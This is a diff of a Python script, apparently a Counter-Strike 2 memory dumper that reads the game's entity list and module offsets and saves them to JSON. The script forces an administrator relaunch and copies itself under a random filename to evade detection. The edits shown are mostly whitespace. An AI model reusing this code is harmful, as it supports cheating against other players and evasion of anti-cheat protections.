@@ -1,12 +1,11 @@
 import psutil
 import sys,os,ctypes,pymem,subprocess,json,time,random,string,struct
 from ctypes import wintypes
-import time
 import colorama
 from colorama import Fore
 import httpx
 
-## iniciar colorama 
+## iniciar colorama
 colorama.init(autoreset=True)
 
 def op(processF):
@@ -21,15 +20,18 @@ def op(processF):
 
 def rdm():
  return "".join(random.choices(string.ascii_letters + string.digits, k=8))
+
 def fk():
  try:import shutil;n=f"{rdm()}.py";shutil.copy(sys.argv[0],n);subprocess.Popen([sys.executable,n]);sys.exit(0)
  except:pass
 
 def clear():
  os.system('cls' if os.name=='nt' else 'clear')
+
 if not ctypes.windll.shell32.IsUserAnAdmin():
  ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable," ".join([f'"{a}"'for a in sys.argv]),None,1)
  sys.exit(0)
+
 kernel32=ctypes.WinDLL('kernel32',use_last_error=True)
 OpenProcess=kernel32.OpenProcess
 OpenProcess.argtypes=[wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]
@@ -38,8 +40,10 @@ ReadProcessMemory=kernel32.ReadProcessMemory
 ReadProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPCVOID,wintypes.LPVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]
 ReadProcessMemory.restype=wintypes.BOOL
 PROCESS_ALL_ACCESS=0x1F0FFF
+
 def g(u,i):
  try:r=httpx.get(u,timeout=10);r.raise_for_status();return r.json()if i else r.text
+
  except Exception as e:print(f"Erro ao baixar {u}: {e}");return None
 
 def i(type, args, *kwargs):
@@ -53,14 +57,15 @@ def i(type, args, *kwargs):
   print(f"{Fore.GREEN}[ + ]: {args[0]}{Fore.RESET}")
  else:
   print(args[0])
-
  print()
+
 def h(p,a,s=8):
  b=ctypes.create_string_buffer(s)
  if not ReadProcessMemory(p,a,b,s,None):return 0
  if s in(1,2,4,8):return int.from_bytes(b.raw,'little')
  elif s==12:return [int.from_bytes(b.raw[i:i+4],'little')for i in range(0,12,4)]
  else:return b.raw.decode(errors='ignore').rstrip('\x00')
+
 def j(p,el,lp,cl_base,cl,co):
  t=[]
  ges=cl_base+cl["dwGameEntitySystem"]
@@ -106,15 +111,16 @@ def j(p,el,lp,cl_base,cl,co):
    print(f"entity {idx}: {ent}")
   except Exception as e:pass
  return t
+
 def main():
  clear()
- time.sleep(0.5)
  print("#############################")
  print("#   FEITO POR: @5n6xc1       #")
  print("#############################")
  try:k()
  except Exception as e:print(f"Erro: {e}")
  finally:input()
+
 def k():
  try:pm=pymem.Pymem("cs2.exe")
  except:print("CS2 nao encontrado");return
@@ -132,7 +138,9 @@ def k():
  for mod in offs:
   if mod.endswith(".dll"):
    try:
+
     base=pymem.process.module_from_name(pm.process_handle,mod).lpBaseOfDll
+
     d[mod+"_base"]=hex(base)
     print(mod+"_base:",hex(base))
     for n,v in offs[mod].items():
@@ -175,5 +183,6 @@ def k():
  with open(f"{dirn}/local_dump.json","w")as wf:json.dump(d,wf,indent=2)
  i("success", [f"{dirn}"], {})
  kernel32.CloseHandle(h_process)
+
 if __name__ == "__main__":
  main()
